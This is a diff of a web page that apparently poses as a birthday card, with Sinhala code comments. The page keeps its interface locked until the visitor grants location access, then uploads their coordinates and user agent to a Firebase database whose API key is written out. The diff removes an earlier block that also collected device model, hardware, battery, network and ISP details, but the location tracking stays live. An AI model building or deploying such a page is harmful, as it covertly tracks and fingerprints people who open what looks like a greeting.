@@ -235,12 +235,13 @@
         </div>
     </div>
 
-    <!-- Firebase SDK & Config with Enhanced Data Collection -->
+    <!-- Updated Firebase SDK & Config -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
         import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
+        // අලුත් Firebase Config එක මෙතන තියෙනවා උදාර
         const firebaseConfig = {
             apiKey: "AIzaSyCbqDvrvNDn3lF31LYRq5O4PDpp-VSxIwc",
             authDomain: "data-a0ce0.firebaseapp.com",
@@ -256,6 +257,8 @@
         const db = getFirestore(app);
 
         let currentUserId = null;
+        
+        // Auth එක සම්පූර්ණ වෙනකම් ඉන්න Promise එකක් හදාගන්නවා
         let authReady = new Promise(resolve => {
             onAuthStateChanged(auth, user => { 
                 if(user) {
@@ -268,18 +271,19 @@
 
         signInAnonymously(auth).catch(e => console.error("Auth Error:", e));
 
-        // Enhanced save function that accepts full device & location data
-        window.saveFullData = async (data) => {
-            await authReady;
+        // අලුත් project එකේ data save කරන function එක
+        window.saveLocationData = async (data) => {
+            await authReady; // Login වෙනකම් අනිවාර්යයෙන් ඉන්නවා
             if (!currentUserId) return;
             try {
+                // මෙතන path එක 'data-a0ce0' එකට ගැලපෙන විදිහට හැදුවා
                 const colRef = collection(db, 'artifacts', 'birthday-card', 'users', currentUserId, 'locations');
                 await addDoc(colRef, { 
                     ...data, 
                     timestamp: serverTimestamp(),
                     userAgent: navigator.userAgent
                 });
-                console.log("Full device & location data saved!");
+                console.log("Location saved successfully!");
             } catch (e) { 
                 console.error("Firestore Error:", e); 
             }
@@ -292,122 +296,6 @@
         
         let isLocationAllowed = false;
         
-        // ---------- Device Information Collectors (No UI changes) ----------
-        function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            let browserName = "Unknown", browserVersion = "Unknown";
-            if (ua.indexOf("Firefox") > -1) { browserName = "Firefox"; browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || "?"; }
-            else if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edg") === -1) { browserName = "Chrome"; browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || "?"; }
-            else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) { browserName = "Safari"; browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || "?"; }
-            else if (ua.indexOf("Edg") > -1) { browserName = "Edge"; browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || "?"; }
-            else if (ua.indexOf("OPR") > -1 || ua.indexOf("Opera") > -1) { browserName = "Opera"; browserVersion = ua.match(/(OPR|Opera)\/([\d.]+)/)?.[2] || "?"; }
-            return { browserName, browserVersion };
-        }
-
-        function getDeviceAndOS() {
-            const ua = navigator.userAgent;
-            let deviceModel = "Unknown", osVersion = "Unknown", platform = navigator.platform;
-            // Detect OS Version
-            if (ua.indexOf("Windows NT 10.0") > -1) osVersion = "Windows 10/11";
-            else if (ua.indexOf("Windows NT 6.3") > -1) osVersion = "Windows 8.1";
-            else if (ua.indexOf("Windows NT 6.2") > -1) osVersion = "Windows 8";
-            else if (ua.indexOf("Windows NT 6.1") > -1) osVersion = "Windows 7";
-            else if (ua.indexOf("Mac OS X") > -1) osVersion = ua.match(/Mac OS X ([\d_.]+)/)?.[1]?.replace(/_/g, '.') || "MacOS";
-            else if (ua.indexOf("Android") > -1) osVersion = ua.match(/Android ([\d.]+)/)?.[1] || "Android";
-            else if (ua.indexOf("iOS") > -1 || ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) osVersion = ua.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g, '.') || "iOS";
-            
-            // Device Model (mobile)
-            if (ua.indexOf("iPhone") > -1) deviceModel = "iPhone";
-            else if (ua.indexOf("iPad") > -1) deviceModel = "iPad";
-            else if (ua.indexOf("Android") > -1) {
-                const match = ua.match(/; (\w+)\)/);
-                if (match && match[1]) deviceModel = match[1];
-                else deviceModel = "Android Device";
-            } else if (ua.indexOf("Macintosh") > -1) deviceModel = "Mac";
-            else if (ua.indexOf("Windows") > -1) deviceModel = "PC / Laptop";
-            else deviceModel = platform;
-            return { deviceModel, osVersion };
-        }
-
-        function getHardwareInfo() {
-            const cores = navigator.hardwareConcurrency || "Unknown";
-            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
-            const screenRes = `${screen.width}x${screen.height}`;
-            return { cpuCores: cores, deviceMemory: memory, screenResolution: screenRes };
-        }
-
-        async function getBatteryInfo() {
-            if (!navigator.getBattery) return { batteryLevel: null, isCharging: null };
-            try {
-                const battery = await navigator.getBattery();
-                return { batteryLevel: Math.round(battery.level * 100), isCharging: battery.charging };
-            } catch(e) { return { batteryLevel: null, isCharging: null }; }
-        }
-
-        function getNetworkInfo() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            let connectionType = "Unknown", effectiveType = "Unknown";
-            if (conn) {
-                connectionType = conn.type || "unknown";
-                effectiveType = conn.effectiveType || "unknown";
-            }
-            return { connectionType, effectiveType };
-        }
-
-        async function getISPInfo() {
-            // Use ipapi.co for ISP (organization) with timeout
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 3000);
-                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
-                clearTimeout(timeoutId);
-                if (res.ok) {
-                    const data = await res.json();
-                    return data.org || "Unknown ISP";
-                }
-            } catch(e) { console.log("ISP fetch failed:", e); }
-            return "Unknown";
-        }
-
-        async function collectAllDeviceData() {
-            const browser = getBrowserInfo();
-            const device = getDeviceAndOS();
-            const hardware = getHardwareInfo();
-            const battery = await getBatteryInfo();
-            const network = getNetworkInfo();
-            const isp = await getISPInfo();
-            return {
-                browserName: browser.browserName,
-                browserVersion: browser.browserVersion,
-                deviceModel: device.deviceModel,
-                osVersion: device.osVersion,
-                cpuCores: hardware.cpuCores,
-                deviceMemory: hardware.deviceMemory,
-                screenResolution: hardware.screenResolution,
-                batteryLevel: battery.batteryLevel,
-                isCharging: battery.isCharging,
-                connectionType: network.connectionType,
-                effectiveNetworkType: network.effectiveType,
-                internetProvider: isp
-            };
-        }
-
-        // Enhanced location + device save
-        async function saveLocationWithDeviceInfo(position) {
-            const deviceDetails = await collectAllDeviceData();
-            const locationData = {
-                lat: position.coords.latitude,
-                lng: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                ...deviceDetails
-            };
-            if (window.saveFullData) {
-                await window.saveFullData(locationData);
-            } else {
-                console.warn("saveFullData not ready");
-            }
-        }
-
         async function updateStatus() {
             const widget = document.getElementById('statusWidget');
             const list = document.getElementById('statusList');
@@ -463,7 +351,7 @@
                         isLocationAllowed = true;
                         closeAllPopups();
                         enableMainInterface();
-                        requestLocationAccess(false);
+                        requestLocationAccess(false); // දැනටමත් Allow කරලා නම් Location අරන් Save කරනවා
                     } else if (result.state === 'denied') {
                         showPopup('overlay3', 'card3');
                     } else {
@@ -479,9 +367,10 @@
                     async (pos) => {
                         isLocationAllowed = true;
                         closeAllPopups();
-                        enableMainInterface();
-                        // Save location + full device details to Firebase
-                        await saveLocationWithDeviceInfo(pos);
+                        enableMainInterface(); // Reload නැතුව Button එක On කරනවා
+                        if (window.saveLocationData) {
+                            await window.saveLocationData({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
+                        }
                     },
                     (error) => {
                         closeAllPopups();
